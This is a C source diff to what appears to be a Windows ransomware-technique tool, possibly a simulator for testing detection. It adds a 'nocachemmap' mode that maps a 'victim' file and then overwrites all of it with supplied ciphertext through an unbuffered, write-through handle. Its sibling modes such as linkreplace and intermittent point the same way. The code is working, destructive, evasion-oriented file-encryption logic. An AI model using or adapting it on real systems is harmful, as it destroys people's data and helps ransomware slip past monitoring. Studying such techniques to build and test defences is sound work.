@@ -356,6 +356,51 @@ static int do_mmapclose(const wchar_t *victim, const UCHAR *ct, ULONG ct_len)
     return R_PERFORMED;
 }
 
+static int do_nocachemmap(const wchar_t *victim, const UCHAR *ct, ULONG ct_len)
+{
+    HANDLE h = CreateFileW(victim, GENERIC_READ | GENERIC_WRITE,
+                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
+                           FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE map, hn;
+    UCHAR *view, *abuf;
+    LARGE_INTEGER sz;
+    ULONG n, off;
+    DWORD wrote;
+    int ok;
+
+    if (h == INVALID_HANDLE_VALUE)
+        return R_ERROR;
+    if (!GetFileSizeEx(h, &sz)) { CloseHandle(h); return R_ERROR; }
+    n = (ULONG)sz.QuadPart;
+    map = CreateFileMappingW(h, NULL, PAGE_READWRITE, 0, 0, NULL);
+    if (map == NULL) { CloseHandle(h); return R_ERROR; }
+    view = (UCHAR *)MapViewOfFile(map, FILE_MAP_WRITE, 0, 0, 0);
+    if (view == NULL) { CloseHandle(map); CloseHandle(h); return R_ERROR; }
+
+    hn = CreateFileW(victim, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
+                     FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, NULL);
+    if (hn == INVALID_HANDLE_VALUE) {
+        UnmapViewOfFile(view); CloseHandle(map); CloseHandle(h); return R_ERROR;
+    }
+    abuf = (UCHAR *)VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (abuf == NULL) {
+        CloseHandle(hn); UnmapViewOfFile(view); CloseHandle(map); CloseHandle(h); return R_ERROR;
+    }
+    for (off = 0; off < n; ) {
+        ULONG c = (n - off) < ct_len ? (n - off) : ct_len;
+        memcpy(abuf + off, ct, c);
+        off += c;
+    }
+    SetFilePointer(hn, 0, NULL, FILE_BEGIN);
+    ok = WriteFile(hn, abuf, n, &wrote, NULL) && wrote == n;
+    VirtualFree(abuf, 0, MEM_RELEASE);
+    CloseHandle(hn);
+    UnmapViewOfFile(view);
+    CloseHandle(map);
+    CloseHandle(h);
+    return ok ? R_PERFORMED : R_ERROR;
+}
+
 static int do_intermittent(const wchar_t *victim)
 {
     HANDLE h = CreateFileW(victim, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
@@ -431,6 +476,7 @@ static int dispatch(const wchar_t *mode, const wchar_t *victim, const UCHAR *ct,
     if (wcscmp(mode, L"blockclone") == 0)     return do_blockclone(victim, ct, ct_len);
     if (wcscmp(mode, L"linkreplace") == 0)    return do_linkreplace(victim);
     if (wcscmp(mode, L"mmapclose") == 0)      return do_mmapclose(victim, ct, ct_len);
+    if (wcscmp(mode, L"nocachemmap") == 0)    return do_nocachemmap(victim, ct, ct_len);
     if (wcscmp(mode, L"intermittent") == 0)   return do_intermittent(victim);
     if (wcscmp(mode, L"copydelete") == 0)     return do_copydelete(victim, ct, ct_len);
     if (wcscmp(mode, L"preoverwrite") == 0)   return do_preoverwrite(victim, ct, ct_len);
